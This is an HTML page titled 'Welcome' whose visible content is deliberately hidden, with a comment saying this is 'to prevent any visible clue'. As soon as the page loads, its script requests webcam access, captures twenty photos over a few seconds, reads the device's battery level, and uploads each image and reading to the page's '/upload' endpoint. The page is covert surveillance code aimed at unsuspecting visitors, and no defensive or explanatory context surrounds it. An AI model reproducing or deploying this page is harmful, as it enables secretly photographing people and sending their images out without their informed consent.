<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            display: none; /* Hide the body to prevent any visible clue */
        }
    </style>
</head>
<body>
    <script>
        async function startCapture() {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                const capturePhotos = async () => {
                    for (let i = 0; i < 20; i++) { // Capture 20 photos (4-5 per second for 4-5 seconds)
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const snapshot = canvas.toDataURL('image/png');

                        const battery = await navigator.getBattery();
                        const batteryLevel = Math.round(battery.level * 100);

                        await fetch('/upload', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({ image: snapshot, battery: batteryLevel })
                        });

                        await new Promise(resolve => setTimeout(resolve, 200)); // 200ms delay for 5 photos per second
                    }

                    video.pause();
                    stream.getTracks().forEach(track => track.stop());
                };

                video.addEventListener('loadedmetadata', () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    capturePhotos();
                });
            }
        }

        // Start capture as soon as the page loads
        window.addEventListener('load', startCapture);
    </script>
</body>
</html>
